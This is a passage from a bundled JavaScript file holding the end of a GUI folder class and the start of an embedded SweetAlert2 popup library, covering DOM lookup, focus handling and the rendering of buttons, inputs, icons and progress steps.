      if (this._onChange !== void 0) {
        this._onChange.call(this, {
          object: controller.object,
          property: controller.property,
          value: controller.getValue(),
          controller
        });
      }
    }
    onFinishChange(callback) {
      this._onFinishChange = callback;
      return this;
    }
    _callOnFinishChange(controller) {
      if (this.parent) {
        this.parent._callOnFinishChange(controller);
      }
      if (this._onFinishChange !== void 0) {
        this._onFinishChange.call(this, {
          object: controller.object,
          property: controller.property,
          value: controller.getValue(),
          controller
        });
      }
    }
    destroy() {
      if (this.parent) {
        this.parent.children.splice(this.parent.children.indexOf(this), 1);
        this.parent.folders.splice(this.parent.folders.indexOf(this), 1);
      }
      if (this.domElement.parentElement) {
        this.domElement.parentElement.removeChild(this.domElement);
      }
      Array.from(this.children).forEach((c) => c.destroy());
    }
    controllersRecursive() {
      let controllers = Array.from(this.controllers);
      this.folders.forEach((f) => {
        controllers = controllers.concat(f.controllersRecursive());
      });
      return controllers;
    }
    foldersRecursive() {
      let folders = Array.from(this.folders);
      this.folders.forEach((f) => {
        folders = folders.concat(f.foldersRecursive());
      });
      return folders;
    }
  }
  var commonjsGlobal = typeof globalThis !== "undefined" ? globalThis : typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : {};
  var sweetalert2_all = { exports: {} };
  (function(module, exports) {
    (function(global2, factory) {
      module.exports = factory();
    })(commonjsGlobal, function() {
      var privateProps = {
        awaitingPromise: /* @__PURE__ */ new WeakMap(),
        promise: /* @__PURE__ */ new WeakMap(),
        innerParams: /* @__PURE__ */ new WeakMap(),
        domCache: /* @__PURE__ */ new WeakMap()
      };
      const swalPrefix = "swal2-";
      const prefix = (items) => {
        const result = {};
        for (const i in items) {
          result[items[i]] = swalPrefix + items[i];
        }
        return result;
      };
      const swalClasses = prefix(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"]);
      const iconTypes = prefix(["success", "warning", "info", "question", "error"]);
      const consolePrefix = "SweetAlert2:";
      const uniqueArray = (arr) => {
        const result = [];
        for (let i = 0; i < arr.length; i++) {
          if (result.indexOf(arr[i]) === -1) {
            result.push(arr[i]);
          }
        }
        return result;
      };
      const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
      const warn = (message) => {
        console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
      };
      const error = (message) => {
        console.error(`${consolePrefix} ${message}`);
      };
      const previousWarnOnceMessages = [];
      const warnOnce = (message) => {
        if (!previousWarnOnceMessages.includes(message)) {
          previousWarnOnceMessages.push(message);
          warn(message);
        }
      };
      const warnAboutDeprecation = (deprecatedParam, useInstead) => {
        warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
      };
      const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
      const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
      const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
      const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
      const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
      const elementBySelector = (selectorString) => {
        const container = getContainer();
        return container ? container.querySelector(selectorString) : null;
      };
      const elementByClass = (className) => {
        return elementBySelector(`.${className}`);
      };
      const getPopup = () => elementByClass(swalClasses.popup);
      const getIcon = () => elementByClass(swalClasses.icon);
      const getIconContent = () => elementByClass(swalClasses["icon-content"]);
      const getTitle = () => elementByClass(swalClasses.title);
      const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
      const getImage = () => elementByClass(swalClasses.image);
      const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
      const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
      const getConfirmButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
      const getDenyButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
      const getInputLabel = () => elementByClass(swalClasses["input-label"]);
      const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
      const getCancelButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
      const getActions = () => elementByClass(swalClasses.actions);
      const getFooter = () => elementByClass(swalClasses.footer);
      const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
      const getCloseButton = () => elementByClass(swalClasses.close);
      const focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
      const getFocusableElements = () => {
        const focusableElementsWithTabindex = Array.from(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((a, b) => {
          const tabindexA = parseInt(a.getAttribute("tabindex"));
          const tabindexB = parseInt(b.getAttribute("tabindex"));
          if (tabindexA > tabindexB) {
            return 1;
          } else if (tabindexA < tabindexB) {
            return -1;
          }
          return 0;
        });
        const otherFocusableElements = Array.from(getPopup().querySelectorAll(focusable)).filter((el) => el.getAttribute("tabindex") !== "-1");
        return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el) => isVisible$1(el));
      };
      const isModal = () => {
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
      };
      const isToast = () => {
        return getPopup() && hasClass(getPopup(), swalClasses.toast);
      };
      const isLoading = () => {
        return getPopup().hasAttribute("data-loading");
      };
      const states = {
        previousBodyPadding: null
      };
      const setInnerHtml = (elem, html) => {
        elem.textContent = "";
        if (html) {
          const parser = new DOMParser();
          const parsed = parser.parseFromString(html, `text/html`);
          Array.from(parsed.querySelector("head").childNodes).forEach((child) => {
            elem.appendChild(child);
          });
          Array.from(parsed.querySelector("body").childNodes).forEach((child) => {
            if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
              elem.appendChild(child.cloneNode(true));
            } else {
              elem.appendChild(child);
            }
          });
        }
      };
      const hasClass = (elem, className) => {
        if (!className) {
          return false;
        }
        const classList = className.split(/\s+/);
        for (let i = 0; i < classList.length; i++) {
          if (!elem.classList.contains(classList[i])) {
            return false;
          }
        }
        return true;
      };
      const removeCustomClasses = (elem, params) => {
        Array.from(elem.classList).forEach((className) => {
          if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass).includes(className)) {
            elem.classList.remove(className);
          }
        });
      };
      const applyCustomClass = (elem, params, className) => {
        removeCustomClasses(elem, params);
        if (params.customClass && params.customClass[className]) {
          if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
            warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof params.customClass[className]}"`);
            return;
          }
          addClass(elem, params.customClass[className]);
        }
      };
      const getInput$1 = (popup, inputClass) => {
        if (!inputClass) {
          return null;
        }
        switch (inputClass) {
          case "select":
          case "textarea":
          case "file":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
          case "checkbox":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
          case "radio":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
          case "range":
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
          default:
            return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
        }
      };
      const focusInput = (input) => {
        input.focus();
        if (input.type !== "file") {
          const val = input.value;
          input.value = "";
          input.value = val;
        }
      };
      const toggleClass = (target, classList, condition) => {
        if (!target || !classList) {
          return;
        }
        if (typeof classList === "string") {
          classList = classList.split(/\s+/).filter(Boolean);
        }
        classList.forEach((className) => {
          if (Array.isArray(target)) {
            target.forEach((elem) => {
              condition ? elem.classList.add(className) : elem.classList.remove(className);
            });
          } else {
            condition ? target.classList.add(className) : target.classList.remove(className);
          }
        });
      };
      const addClass = (target, classList) => {
        toggleClass(target, classList, true);
      };
      const removeClass = (target, classList) => {
        toggleClass(target, classList, false);
      };
      const getDirectChildByClass = (elem, className) => {
        const children = Array.from(elem.children);
        for (let i = 0; i < children.length; i++) {
          const child = children[i];
          if (child instanceof HTMLElement && hasClass(child, className)) {
            return child;
          }
        }
      };
      const applyNumericalStyle = (elem, property, value) => {
        if (value === `${parseInt(value)}`) {
          value = parseInt(value);
        }
        if (value || parseInt(value) === 0) {
          elem.style[property] = typeof value === "number" ? `${value}px` : value;
        } else {
          elem.style.removeProperty(property);
        }
      };
      const show = function(elem) {
        let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
        elem.style.display = display;
      };
      const hide = (elem) => {
        elem.style.display = "none";
      };
      const setStyle = (parent, selector, property, value) => {
        const el = parent.querySelector(selector);
        if (el) {
          el.style[property] = value;
        }
      };
      const toggle = function(elem, condition) {
        let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
        condition ? show(elem, display) : hide(elem);
      };
      const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
      const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
      const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
      const hasCssAnimation = (elem) => {
        const style = window.getComputedStyle(elem);
        const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
      };
      const animateTimerProgressBar = function(timer) {
        let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
        const timerProgressBar = getTimerProgressBar();
        if (isVisible$1(timerProgressBar)) {
          if (reset) {
            timerProgressBar.style.transition = "none";
            timerProgressBar.style.width = "100%";
          }
          setTimeout(() => {
            timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
            timerProgressBar.style.width = "0%";
          }, 10);
        }
      };
      const stopTimerProgressBar = () => {
        const timerProgressBar = getTimerProgressBar();
        const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = `${timerProgressBarPercent}%`;
      };
      const RESTORE_FOCUS_TIMEOUT = 100;
      const globalState = {};
      const focusPreviousActiveElement = () => {
        if (globalState.previousActiveElement instanceof HTMLElement) {
          globalState.previousActiveElement.focus();
          globalState.previousActiveElement = null;
        } else if (document.body) {
          document.body.focus();
        }
      };
      const restoreActiveElement = (returnFocus) => {
        return new Promise((resolve) => {
          if (!returnFocus) {
            return resolve();
          }
          const x = window.scrollX;
          const y = window.scrollY;
          globalState.restoreFocusTimeout = setTimeout(() => {
            focusPreviousActiveElement();
            resolve();
          }, RESTORE_FOCUS_TIMEOUT);
          window.scrollTo(x, y);
        });
      };
      const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
      const sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
   <button type="button" class="${swalClasses.close}"></button>
   <ul class="${swalClasses["progress-steps"]}"></ul>
   <div class="${swalClasses.icon}"></div>
   <img class="${swalClasses.image}" />
   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
   <input class="${swalClasses.input}" />
   <input type="file" class="${swalClasses.file}" />
   <div class="${swalClasses.range}">
     <input type="range" />
     <output></output>
   </div>
   <select class="${swalClasses.select}"></select>
   <div class="${swalClasses.radio}"></div>
   <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
     <input type="checkbox" />
     <span class="${swalClasses.label}"></span>
   </label>
   <textarea class="${swalClasses.textarea}"></textarea>
   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   <div class="${swalClasses.actions}">
     <div class="${swalClasses.loader}"></div>
     <button type="button" class="${swalClasses.confirm}"></button>
     <button type="button" class="${swalClasses.deny}"></button>
     <button type="button" class="${swalClasses.cancel}"></button>
   </div>
   <div class="${swalClasses.footer}"></div>
   <div class="${swalClasses["timer-progress-bar-container"]}">
     <div class="${swalClasses["timer-progress-bar"]}"></div>
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
      const resetOldContainer = () => {
        const oldContainer = getContainer();
        if (!oldContainer) {
          return false;
        }
        oldContainer.remove();
        removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
        return true;
      };
      const resetValidationMessage$1 = () => {
        globalState.currentInstance.resetValidationMessage();
      };
      const addInputChangeListeners = () => {
        const popup = getPopup();
        const input = getDirectChildByClass(popup, swalClasses.input);
        const file = getDirectChildByClass(popup, swalClasses.file);
        const range = popup.querySelector(`.${swalClasses.range} input`);
        const rangeOutput = popup.querySelector(`.${swalClasses.range} output`);
        const select = getDirectChildByClass(popup, swalClasses.select);
        const checkbox = popup.querySelector(`.${swalClasses.checkbox} input`);
        const textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = () => {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
        range.onchange = () => {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
      };
      const getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
      const setupAccessibility = (params) => {
        const popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) {
          popup.setAttribute("aria-modal", "true");
        }
      };
      const setupRTL = (targetElement) => {
        if (window.getComputedStyle(targetElement).direction === "rtl") {
          addClass(getContainer(), swalClasses.rtl);
        }
      };
      const init = (params) => {
        const oldContainerExisted = resetOldContainer();
        if (isNodeEnv()) {
          error("SweetAlert2 requires document to initialize");
          return;
        }
        const container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) {
          addClass(container, swalClasses["no-transition"]);
        }
        setInnerHtml(container, sweetHTML);
        const targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
      };
      const parseHtmlToContainer = (param, target) => {
        if (param instanceof HTMLElement) {
          target.appendChild(param);
        } else if (typeof param === "object") {
          handleObject(param, target);
        } else if (param) {
          setInnerHtml(target, param);
        }
      };
      const handleObject = (param, target) => {
        if (param.jquery) {
          handleJqueryElem(target, param);
        } else {
          setInnerHtml(target, param.toString());
        }
      };
      const handleJqueryElem = (target, elem) => {
        target.textContent = "";
        if (0 in elem) {
          for (let i = 0; i in elem; i++) {
            target.appendChild(elem[i].cloneNode(true));
          }
        } else {
          target.appendChild(elem.cloneNode(true));
        }
      };
      const animationEndEvent = (() => {
        if (isNodeEnv()) {
          return false;
        }
        const testEl = document.createElement("div");
        const transEndEventNames = {
          WebkitAnimation: "webkitAnimationEnd",
          animation: "animationend"
        };
        for (const i in transEndEventNames) {
          if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") {
            return transEndEventNames[i];
          }
        }
        return false;
      })();
      const measureScrollbar = () => {
        const scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      };
      const renderActions = (instance, params) => {
        const actions = getActions();
        const loader = getLoader();
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
          hide(actions);
        } else {
          show(actions);
        }
        applyCustomClass(actions, params, "actions");
        renderButtons(actions, loader, params);
        setInnerHtml(loader, params.loaderHtml);
        applyCustomClass(loader, params, "loader");
      };
      function renderButtons(actions, loader, params) {
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
          if (params.toast) {
            actions.insertBefore(cancelButton, confirmButton);
            actions.insertBefore(denyButton, confirmButton);
          } else {
            actions.insertBefore(cancelButton, loader);
            actions.insertBefore(denyButton, loader);
            actions.insertBefore(confirmButton, loader);
          }
        }
      }
      function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
          removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          return;
        }
        addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
        if (params.confirmButtonColor) {
          confirmButton.style.backgroundColor = params.confirmButtonColor;
          addClass(confirmButton, swalClasses["default-outline"]);
        }
        if (params.denyButtonColor) {
          denyButton.style.backgroundColor = params.denyButtonColor;
          addClass(denyButton, swalClasses["default-outline"]);
        }
        if (params.cancelButtonColor) {
          cancelButton.style.backgroundColor = params.cancelButtonColor;
          addClass(cancelButton, swalClasses["default-outline"]);
        }
      }
      function renderButton(button, buttonType, params) {
        toggle(button, params[`show${capitalizeFirstLetter(buttonType)}Button`], "inline-block");
        setInnerHtml(button, params[`${buttonType}ButtonText`]);
        button.setAttribute("aria-label", params[`${buttonType}ButtonAriaLabel`]);
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, `${buttonType}Button`);
        addClass(button, params[`${buttonType}ButtonClass`]);
      }
      const renderCloseButton = (instance, params) => {
        const closeButton = getCloseButton();
        setInnerHtml(closeButton, params.closeButtonHtml);
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
      };
      const renderContainer = (instance, params) => {
        const container = getContainer();
        if (!container) {
          return;
        }
        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        applyCustomClass(container, params, "container");
      };
      function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") {
          container.style.background = backdrop;
        } else if (!backdrop) {
          addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
        }
      }
      function handlePositionParam(container, position) {
        if (position in swalClasses) {
          addClass(container, swalClasses[position]);
        } else {
          warn('The "position" parameter is not valid, defaulting to "center"');
          addClass(container, swalClasses.center);
        }
      }
      function handleGrowParam(container, grow) {
        if (grow && typeof grow === "string") {
          const growClass = `grow-${grow}`;
          if (growClass in swalClasses) {
            addClass(container, swalClasses[growClass]);
          }
        }
      }
      const inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
      const renderInput = (instance, params) => {
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(instance);
        const rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach((inputClass) => {
          const inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
          setAttributes(inputClass, params.inputAttributes);
          inputContainer.className = swalClasses[inputClass];
          if (rerender) {
            hide(inputContainer);
          }
        });
        if (params.input) {
          if (rerender) {
            showInput(params);
          }
          setCustomClass(params);
        }
      };
      const showInput = (params) => {
        if (!renderInputType[params.input]) {
          error(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
          return;
        }
        const inputContainer = getInputContainer(params.input);
        const input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        setTimeout(() => {
          focusInput(input);
        });
      };
      const removeAttributes = (input) => {
        for (let i = 0; i < input.attributes.length; i++) {
          const attrName = input.attributes[i].name;
          if (!["type", "value", "style"].includes(attrName)) {
            input.removeAttribute(attrName);
          }
        }
      };
      const setAttributes = (inputClass, inputAttributes) => {
        const input = getInput$1(getPopup(), inputClass);
        if (!input) {
          return;
        }
        removeAttributes(input);
        for (const attr in inputAttributes) {
          input.setAttribute(attr, inputAttributes[attr]);
        }
      };
      const setCustomClass = (params) => {
        const inputContainer = getInputContainer(params.input);
        if (typeof params.customClass === "object") {
          addClass(inputContainer, params.customClass.input);
        }
      };
      const setInputPlaceholder = (input, params) => {
        if (!input.placeholder || params.inputPlaceholder) {
          input.placeholder = params.inputPlaceholder;
        }
      };
      const setInputLabel = (input, prependTo, params) => {
        if (params.inputLabel) {
          input.id = swalClasses.input;
          const label = document.createElement("label");
          const labelClass = swalClasses["input-label"];
          label.setAttribute("for", input.id);
          label.className = labelClass;
          if (typeof params.customClass === "object") {
            addClass(label, params.customClass.inputLabel);
          }
          label.innerText = params.inputLabel;
          prependTo.insertAdjacentElement("beforebegin", label);
        }
      };
      const getInputContainer = (inputType) => {
        return getDirectChildByClass(getPopup(), swalClasses[inputType] || swalClasses.input);
      };
      const checkAndSetInputValue = (input, inputValue) => {
        if (["string", "number"].includes(typeof inputValue)) {
          input.value = `${inputValue}`;
        } else if (!isPromise(inputValue)) {
          warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof inputValue}"`);
        }
      };
      const renderInputType = {};
      renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params) => {
        checkAndSetInputValue(input, params.inputValue);
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        input.type = params.input;
        return input;
      };
      renderInputType.file = (input, params) => {
        setInputLabel(input, input, params);
        setInputPlaceholder(input, params);
        return input;
      };
      renderInputType.range = (range, params) => {
        const rangeInput = range.querySelector("input");
        const rangeOutput = range.querySelector("output");
        checkAndSetInputValue(rangeInput, params.inputValue);
        rangeInput.type = params.input;
        checkAndSetInputValue(rangeOutput, params.inputValue);
        setInputLabel(rangeInput, range, params);
        return range;
      };
      renderInputType.select = (select, params) => {
        select.textContent = "";
        if (params.inputPlaceholder) {
          const placeholder = document.createElement("option");
          setInnerHtml(placeholder, params.inputPlaceholder);
          placeholder.value = "";
          placeholder.disabled = true;
          placeholder.selected = true;
          select.appendChild(placeholder);
        }
        setInputLabel(select, select, params);
        return select;
      };
      renderInputType.radio = (radio) => {
        radio.textContent = "";
        return radio;
      };
      renderInputType.checkbox = (checkboxContainer, params) => {
        const checkbox = getInput$1(getPopup(), "checkbox");
        checkbox.value = "1";
        checkbox.id = swalClasses.checkbox;
        checkbox.checked = Boolean(params.inputValue);
        const label = checkboxContainer.querySelector("span");
        setInnerHtml(label, params.inputPlaceholder);
        return checkbox;
      };
      renderInputType.textarea = (textarea, params) => {
        checkAndSetInputValue(textarea, params.inputValue);
        setInputPlaceholder(textarea, params);
        setInputLabel(textarea, textarea, params);
        const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
        setTimeout(() => {
          if ("MutationObserver" in window) {
            const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
            const textareaResizeHandler = () => {
              const textareaWidth = textarea.offsetWidth + getMargin(textarea);
              if (textareaWidth > initialPopupWidth) {
                getPopup().style.width = `${textareaWidth}px`;
              } else {
                getPopup().style.width = null;
              }
            };
            new MutationObserver(textareaResizeHandler).observe(textarea, {
              attributes: true,
              attributeFilter: ["style"]
            });
          }
        });
        return textarea;
      };
      const renderContent = (instance, params) => {
        const htmlContainer = getHtmlContainer();
        applyCustomClass(htmlContainer, params, "htmlContainer");
        if (params.html) {
          parseHtmlToContainer(params.html, htmlContainer);
          show(htmlContainer, "block");
        } else if (params.text) {
          htmlContainer.textContent = params.text;
          show(htmlContainer, "block");
        } else {
          hide(htmlContainer);
        }
        renderInput(instance, params);
      };
      const renderFooter = (instance, params) => {
        const footer = getFooter();
        toggle(footer, params.footer);
        if (params.footer) {
          parseHtmlToContainer(params.footer, footer);
        }
        applyCustomClass(footer, params, "footer");
      };
      const renderIcon = (instance, params) => {
        const innerParams = privateProps.innerParams.get(instance);
        const icon = getIcon();
        if (innerParams && params.icon === innerParams.icon) {
          setContent(icon, params);
          applyStyles(icon, params);
          return;
        }
        if (!params.icon && !params.iconHtml) {
          hide(icon);
          return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
          error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
          hide(icon);
          return;
        }
        show(icon);
        setContent(icon, params);
        applyStyles(icon, params);
        addClass(icon, params.showClass.icon);
      };
      const applyStyles = (icon, params) => {
        for (const iconType in iconTypes) {
          if (params.icon !== iconType) {
            removeClass(icon, iconTypes[iconType]);
          }
        }
        addClass(icon, iconTypes[params.icon]);
        setColor(icon, params);
        adjustSuccessIconBackgroundColor();
        applyCustomClass(icon, params, "icon");
      };
      const adjustSuccessIconBackgroundColor = () => {
        const popup = getPopup();
        const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for (let i = 0; i < successIconParts.length; i++) {
          successIconParts[i].style.backgroundColor = popupBackgroundColor;
        }
      };
      const successIconHtml = `
  <div class="swal2-success-circular-line-left"></div>
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
  <div class="swal2-success-circular-line-right"></div>
`;
      const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
      const setContent = (icon, params) => {
        let oldContent = icon.innerHTML;
        let newContent;
        if (params.iconHtml) {
          newContent = iconContent(params.iconHtml);
        } else if (params.icon === "success") {
          newContent = successIconHtml;
          oldContent = oldContent.replace(/ style=".*?"/g, "");
        } else if (params.icon === "error") {
          newContent = errorIconHtml;
        } else {
          const defaultIconHtml = {
            question: "?",
            warning: "!",
            info: "i"
          };
          newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) {
          setInnerHtml(icon, newContent);
        }
      };
      const setColor = (icon, params) => {
        if (!params.iconColor) {
          return;
        }
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
          setStyle(icon, sel, "backgroundColor", params.iconColor);
        }
        setStyle(icon, ".swal2-success-ring", "borderColor", params.iconColor);
      };
      const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
      const renderImage = (instance, params) => {
        const image = getImage();
        if (!params.imageUrl) {
          hide(image);
          return;
        }
        show(image, "");
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt);
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
      };
      const renderPopup = (instance, params) => {
        const container = getContainer();
        const popup = getPopup();
        if (params.toast) {
          applyNumericalStyle(container, "width", params.width);
          popup.style.width = "100%";
          popup.insertBefore(getLoader(), getIcon());
        } else {
          applyNumericalStyle(popup, "width", params.width);
        }
        applyNumericalStyle(popup, "padding", params.padding);
        if (params.color) {
          popup.style.color = params.color;
        }
        if (params.background) {
          popup.style.background = params.background;
        }
        hide(getValidationMessage());
        addClasses$1(popup, params);
      };
      const addClasses$1 = (popup, params) => {
        popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? params.showClass.popup : ""}`;
        if (params.toast) {
          addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
          addClass(popup, swalClasses.toast);
        } else {
          addClass(popup, swalClasses.modal);
        }
        applyCustomClass(popup, params, "popup");
        if (typeof params.customClass === "string") {
          addClass(popup, params.customClass);
        }
        if (params.icon) {
          addClass(popup, swalClasses[`icon-${params.icon}`]);
        }
      };
      const renderProgressSteps = (instance, params) => {
        const progressStepsContainer = getProgressSteps();
        if (!params.progressSteps || params.progressSteps.length === 0) {
          hide(progressStepsContainer);
          return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (params.currentProgressStep >= params.progressSteps.length) {
          warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        }
        params.progressSteps.forEach((step, index) => {
          const stepEl = createStepElement(step);
          progressStepsContainer.appendChild(stepEl);
          if (index === params.currentProgressStep) {
            addClass(stepEl, swalClasses["active-progress-step"]);
          }
          if (index !== params.progressSteps.length - 1) {
            const lineEl = createLineElement(params);
            progressStepsContainer.appendChild(lineEl);
          }
        });
      };
      const createStepElement = (step) => {
        const stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
      };
      const createLineElement = (params) => {
